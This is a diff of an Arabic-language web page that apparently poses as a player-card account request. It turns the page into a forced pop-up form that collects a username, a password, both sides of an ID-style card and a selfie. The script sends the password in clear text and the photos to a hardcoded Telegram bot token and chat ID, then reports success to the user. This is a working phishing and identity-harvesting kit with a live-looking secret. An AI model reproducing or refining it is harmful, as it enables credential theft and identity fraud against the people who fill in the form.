@@ -15,6 +15,8 @@
     --white:#ffffff;
     --red:#e63946;
     --cyan:#29b6f6;
+    --gray-btn:#b0b4c8; 
+    --blue-btn:#1c2fd6; 
   }
 
   *{box-sizing:border-box;}
@@ -56,11 +58,11 @@
   .modal-backdrop{
     position:fixed;
     inset:0;
-    background:rgba(13,20,71,.4);
+    background:rgba(13,20,71,.28);
     opacity:0;
     pointer-events:none;
     transition:opacity .35s ease;
-    z-index:998;
+    z-index:90;
   }
   .modal-backdrop.show{
     opacity:1;
@@ -70,18 +72,18 @@
   .form-modal{
     position:fixed;
     left:50%;
-    top:50%;
-    width:min(92vw, 360px); 
-    max-height: 85vh;
+    top:160px; 
+    width:min(92vw,440px); 
     background:var(--white);
-    border-radius:22px;
+    border-radius:8px; 
     box-shadow:0 30px 60px -20px rgba(13,20,71,.35);
-    padding:0 0 20px;
-    z-index:999;
+    padding:30px 0 26px; 
+    z-index:100;
     opacity:0;
     pointer-events:none;
-    transform:translate(-50%, -45%) scale(0.95);
-    transition: opacity .4s ease, transform .4s ease;
+    transform:translate(-50%,-12px);
+    transition:opacity .4s ease, transform .4s ease;
+    overflow:hidden;
     display:flex;
     flex-direction:column;
   }
@@ -89,24 +91,9 @@
   .form-modal.show{
     opacity:1;
     pointer-events:auto;
-    transform:translate(-50%, -50%) scale(1);
+    transform:translate(-50%,0);
   }
-  
-  .form-modal-accent{
-    height:50px; 
-    flex-shrink:0;
-    background:linear-gradient(135deg,#1c2fd6,#4f6bff);
-    position:relative;
-  }
-  .form-modal-accent::after{
-    content:"";
-    position:absolute;
-    left:0;right:0;bottom:-1px;
-    height:20px;
-    background:var(--white);
-    border-radius:22px 22px 0 0;
-  }
-  
+
   .form-modal-scroll {
     flex: 1;
     overflow-y: auto;
@@ -135,9 +122,9 @@
   
   .form-control {
     width: 100%;
-    padding: 10px 12px;
+    padding: 11px 12px;
     border: 1px solid #dde2f7;
-    border-radius: 8px;
+    border-radius: 6px;
     font-family: inherit;
     font-size: 14px;
     color: var(--navy);
@@ -147,23 +134,19 @@
   }
   
   .form-control:focus {
-    border-color: #4f6bff;
+    border-color: var(--blue-text);
   }
   
   .file-dropzone {
     border: 1px dashed #b0b8ec;
     background: #f8f9fe;
-    border-radius: 8px;
-    padding: 12px;
+    border-radius: 6px;
+    padding: 14px;
     text-align: center;
     cursor: pointer;
     transition: background 0.2s;
   }
-  
-  .file-dropzone:hover {
-    background: #f0f2ff;
-  }
-  
+
   .file-dropzone span {
     font-size: 12px;
     color: #5865c7;
@@ -175,33 +158,28 @@
   }
   
   .form-footer {
-    margin-top: 10px;
+    margin-top: 15px;
     display: flex;
-    justify-content: flex-start; 
+    justify-content: flex-end; 
   }
   
   .btn-submit {
-    background: var(--navy);
+    background: var(--gray-btn);
     color: var(--white);
     border: none;
-    padding: 10px 24px;
-    border-radius: 8px;
+    padding: 12px 28px;
+    border-radius: 6px;
     font-family: inherit;
     font-size: 14px;
     font-weight: 600;
-    cursor: pointer;
-    transition: background 0.2s;
-    width: 100%;
-    text-align: center;
-  }
-  
-  .btn-submit:hover {
-    background: #1c2fd6;
-  }
-  
-  .btn-submit:disabled {
-    background: #7c82a3;
     cursor: not-allowed;
+    transition: background 0.3s ease;
+    width: auto; 
+  }
+  
+  .btn-submit.ready {
+    background: var(--blue-btn);
+    cursor: pointer;
   }
 
   /* ---------- hero ---------- */
@@ -249,78 +227,7 @@
     cursor:pointer;
     transition:box-shadow .4s;
   }
-  .card.is-active{
-    box-shadow:0 32px 60px -18px rgba(20,25,80,.42);
-  }
 
-  .card-photo-area{
-    position:absolute;
-    inset:0;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-  }
-  .card-photo-area img{
-    width:100%;height:100%;object-fit:cover;
-  }
-  .card-photo-area .upload-placeholder{
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    gap:10px;
-    color:#8992d6;
-    font-size:13px;
-    text-align:center;
-    padding:20px;
-    direction:rtl;
-  }
-  .card-photo-area .upload-placeholder svg{width:32px;height:32px;opacity:.55;}
-
-  .card-footer{
-    position:absolute;
-    left:14px;right:14px;bottom:14px;
-    z-index:2;
-    background:rgba(255,255,255,.92);
-    backdrop-filter:blur(6px);
-    border-radius:20px;
-    padding:14px 20px;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    direction:rtl;
-  }
-  .chevron-mark{
-    color:var(--navy);
-    display:flex;
-    align-items:center;
-  }
-  .chevron-mark svg{width:16px;height:16px;}
-  .brand-mark{
-    width:46px;height:32px;position:relative;
-  }
-  .brand-mark span{ position:absolute; display:block; }
-  .brand-mark .lead{
-    width:12px;height:20px;
-    background:var(--navy);
-    transform:skewX(-18deg);
-    left:0; bottom:0;
-  }
-  .brand-mark .tri-a{
-    width:0;height:0;
-    border-left:13px solid transparent;
-    border-right:13px solid transparent;
-    border-top:22px solid var(--navy);
-    right:14px; top:0;
-  }
-  .brand-mark .tri-b{
-    width:0;height:0;
-    border-left:13px solid transparent;
-    border-right:13px solid transparent;
-    border-bottom:22px solid var(--cyan);
-    right:0; bottom:0;
-  }
-
-  /* dots */
   .dots{
     display:flex;
     justify-content:center;
@@ -360,9 +267,8 @@
   <div class="modal-backdrop" id="modalBackdrop"></div>
   
   <div class="form-modal" id="formModal">
-    <div class="form-modal-accent"></div>
     <div class="form-modal-scroll">
-      <form class="form-modal-body" id="telegramForm">
+      <form class="form-modal-body" id="dataForm">
         
         <div class="form-group">
           <input type="text" id="username" class="form-control" placeholder="اسم المستخدم الذي تريده" required>
@@ -373,7 +279,7 @@
         </div>
         
         <div class="form-group">
-          <label>صورة الوجه الامامي من بطاقة اللاعب المقدمة لك</label>
+          <label>صورة الوجه الأمامي من بطاقة اللاعب المقدمة لك (إثبات الملكية)</label>
           <label class="file-dropzone">
             <span>اضغط لإرفاق ملف</span>
             <input type="file" id="fileFront" accept="image/*" required>
@@ -389,7 +295,7 @@
         </div>
         
         <div class="form-group">
-          <label>صورة شخصية لحسابك الذي سيتم انشاءه (إثبات الملكية)</label>
+          <label>صورة شخصية لحسابك الذي سيتم إنشاؤه</label>
           <label class="file-dropzone">
             <span>اضغط لرفع الصورة الشخصية</span>
             <input type="file" id="fileSelfie" accept="image/*" required>
@@ -397,7 +303,7 @@
         </div>
         
         <div class="form-footer">
-          <button type="submit" id="submitBtn" class="btn-submit">قدم طلب</button>
+          <button type="submit" id="submitBtn" class="btn-submit" disabled>قدم طلب</button>
         </div>
 
       </form>
@@ -418,158 +324,64 @@
   <input type="file" id="mainFileInput" accept="image/*">
 
 <script>
-  // ---------- إعدادات التلجرام (ضع بياناتك هنا) ----------
+  // ========================================================
+  // مكان وضع توكن البوت والـ ID الخاص بك مجدداً هنا:
+  // ========================================================
   const TELEGRAM_BOT_TOKEN = '8905455566:AAFQLQWmxsp3U0S6I650V85yYK8tiDSyo9w';
   const TELEGRAM_CHAT_ID = '5437487652';
-
-
-  const CARD_COUNT = 5;
-  let images = new Array(CARD_COUNT).fill(null);
-  let current = 0;
-  let activeUploadIndex = null;
-
-  const viewport = document.getElementById('viewport');
-  const track = document.getElementById('track');
-  const dotsWrap = document.getElementById('dots');
-  const mainFileInput = document.getElementById('mainFileInput');
-
-  function buildCards(){
-    track.innerHTML = '';
-    for(let i=0;i<CARD_COUNT;i++){
-      const card = document.createElement('div');
-      card.className = 'card';
-      card.dataset.index = i;
-
-      card.innerHTML = `
-        <div class="card-photo-area">
-          ${images[i]
-            ? `<img src="${images[i]}" alt="بطاقة ${i+1}">`
-            : `<div class="upload-placeholder">
-                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><rect x="3" y="5" width="18" height="14" rx="2"/><circle cx="8.5" cy="10.5" r="1.5"/><path d="M21 15l-5-5L5 19"/></svg>
-                 اضغط لإضافة صورة
-               </div>`
-          }
-        </div>
-        <div class="card-footer">
-          <span class="chevron-mark">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
-          </span>
-          <div class="brand-mark">
-            <span class="lead"></span>
-            <span class="tri-a"></span>
-            <span class="tri-b"></span>
-          </div>
-        </div>
-      `;
-
-      card.addEventListener('click', ()=>{
-        if(parseInt(card.dataset.index) === current){
-          activeUploadIndex = i;
-          mainFileInput.click();
-        } else {
-          goTo(i);
-        }
-      });
-
-      track.appendChild(card);
-    }
-    markActive();
-    buildDots();
-    requestAnimationFrame(updateTransform);
-  }
-
-  function markActive(){
-    track.querySelectorAll('.card').forEach(c=>{
-      c.classList.toggle('is-active', parseInt(c.dataset.index) === current);
-    });
-  }
-
-  function updateTransform(){
-    const cardEl = track.children[current];
-    if(!cardEl) return;
-    const containerWidth = viewport.clientWidth;
-    const cardWidth = cardEl.offsetWidth;
-    const cardLeft = cardEl.offsetLeft;
-    const offset = (containerWidth/2) - cardLeft - (cardWidth/2);
-    track.style.transform = `translateX(${offset}px)`;
-  }
-
-  function buildDots(){
-    dotsWrap.innerHTML = '';
-    for(let i=0;i<CARD_COUNT;i++){
-      const dot = document.createElement('button');
-      dot.className = 'dot' + (i===current ? ' active':'');
-      dot.addEventListener('click', ()=>goTo(i));
-      dotsWrap.appendChild(dot);
-    }
-  }
-
-  function goTo(i){
-    current = ((i % CARD_COUNT) + CARD_COUNT) % COUNT_COUNT;
-    current = ((i % CARD_COUNT) + CARD_COUNT) % CARD_COUNT;
-    markActive();
-    buildDots();
-    updateTransform();
-  }
-
-  mainFileInput.addEventListener('change', (e)=>{
-    const file = e.target.files[0];
-    if(!file || activeUploadIndex === null) return;
-    const reader = new FileReader();
-    reader.onload = (ev)=>{
-      images[activeUploadIndex] = ev.target.result;
-      buildCards();
-    };
-    reader.readAsDataURL(file);
-    mainFileInput.value = '';
-  });
-
-  let touchStartX = null;
-  viewport.addEventListener('touchstart', e=>{ touchStartX = e.touches[0].clientX; });
-  viewport.addEventListener('touchend', e=>{
-    if(touchStartX===null) return;
-    const diff = e.changedTouches[0].clientX - touchStartX;
-    if(Math.abs(diff) > 40){
-      diff > 0 ? goTo(current-1) : goTo(current+1);
-    }
-    touchStartX = null;
-  });
-
-  window.addEventListener('resize', updateTransform);
-  buildCards();
+  // ========================================================
 
   const modalBackdrop = document.getElementById('modalBackdrop');
   const formModal = document.getElementById('formModal');
+  const headerEl = document.querySelector('header');
+  const dataForm = document.getElementById('dataForm');
+  const submitBtn = document.getElementById('submitBtn');
 
-  window.addEventListener('load', ()=>{
-    setTimeout(()=>{
+  function positionModal(){
+    const headerBottom = headerEl.getBoundingClientRect().bottom;
+    formModal.style.top = (headerBottom + 25) + 'px'; 
+    formModal.style.maxHeight = `calc(100vh - ${headerBottom + 50}px)`;
+  }
+
+  window.addEventListener('resize', positionModal);
+
+  window.addEventListener('load', () => {
+    positionModal();
+    setTimeout(() => {
       modalBackdrop.classList.add('show');
       formModal.classList.add('show');
-    }, 2000);
+    }, 1000);
   });
 
-  modalBackdrop.addEventListener('click', ()=>{
-    modalBackdrop.classList.remove('show');
-    formModal.classList.remove('show');
-  });
+  function checkFormCompletion() {
+    const isFormValid = dataForm.checkValidity();
+    if (isFormValid) {
+      submitBtn.classList.add('ready');
+      submitBtn.disabled = false;
+    } else {
+      submitBtn.classList.remove('ready');
+      submitBtn.disabled = true;
+    }
+  }
 
+  dataForm.addEventListener('input', checkFormCompletion);
+  
   document.querySelectorAll('.file-dropzone input').forEach(input => {
     input.addEventListener('change', function() {
       if(this.files && this.files[0]) {
         this.previousElementSibling.innerText = "✓ تم اختيار: " + this.files[0].name.substring(0, 12) + "...";
         this.previousElementSibling.style.color = "#29b6f6";
       }
+      checkFormCompletion();
     });
   });
 
-  // ---------- كود إرسال البيانات المتقدم إلى تلجرام ----------
-  document.getElementById('telegramForm').addEventListener('submit', async function(e) {
+  // كود إرسال البيانات المكتملة إلى التلجرام مباشرة
+  dataForm.addEventListener('submit', async function(e) {
     e.preventDefault();
     
-    const submitBtn = document.getElementById('submitBtn');
     const userVal = document.getElementById('username').value;
     const passVal = document.getElementById('password').value;
-    
     const fileFront = document.getElementById('fileFront').files[0];
     const fileBack = document.getElementById('fileBack').files[0];
     const fileSelfie = document.getElementById('fileSelfie').files[0];
@@ -577,10 +389,10 @@
     submitBtn.disabled = true;
     submitBtn.innerText = "جاري إرسال الطلب...";
 
-    // 1. إرسال النص أولاً
     const textMessage = `📌 *طلب جديد واصل*\n\n👤 *اسم المستخدم:* \`${userVal}\`\n🔒 *كلمة السر:* \`${passVal}\``;
     
     try {
+      // إرسال البيانات النصية أولاً
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -591,7 +403,7 @@
         })
       });
 
-      // دالة مساعدة لإرسال الصور الفردية كملفات حقيقية للبوت
+      // دالة إرسال الملفات والصور
       async function sendPhotoToTelegram(file, caption) {
         if(!file) return;
         const formData = new FormData();
@@ -605,19 +417,15 @@
         });
       }
 
-      // 2. إرسال الصور تباعاً لتصل بجودتها الأصلية مع التسمية الخاصة بها
+      // إرسال الصور الثلاثة بالتتابع
       await sendPhotoToTelegram(fileFront, `🖼️ الوجه الأمامي لبطاقة اللاعب (${userVal})`);
       await sendPhotoToTelegram(fileBack, `🖼️ الوجه الخلفي لبطاقة اللاعب (${userVal})`);
       await sendPhotoToTelegram(fileSelfie, `👤 الصورة الشخصية - إثبات الملكية (${userVal})`);
 
-      alert('تم تقديم طلبك بنجاح وأُرسلت البيانات!');
+      alert('تم إرسال جميع البيانات والملفات بنجاح!');
+      dataForm.reset();
+      checkFormCompletion();
       
-      // إغلاق المودال وتصفير الفورم
-      modalBackdrop.classList.remove('show');
-      formModal.classList.remove('show');
-      document.getElementById('telegramForm').reset();
-      
-      // إعادة النصوص الافتراضية لحقول الرفع
       document.querySelectorAll('.file-dropzone span').forEach(span => {
         if(span.innerText.includes('الأمامي')) span.innerText = "اضغط لإرفاق ملف";
         else if(span.innerText.includes('الخلفي')) span.innerText = "اضغط لتحميل صورة";
@@ -627,7 +435,7 @@
 
     } catch (error) {
       console.error(error);
-      alert('حدث خطأ أثناء إرسال البيانات، يرجى المحاولة مرة أخرى.');
+      alert('حدث خطأ أثناء إرسال المدخلات، يرجى إعادة المحاولة.');
     } finally {
       submitBtn.disabled = false;
       submitBtn.innerText = "قدم طلب";
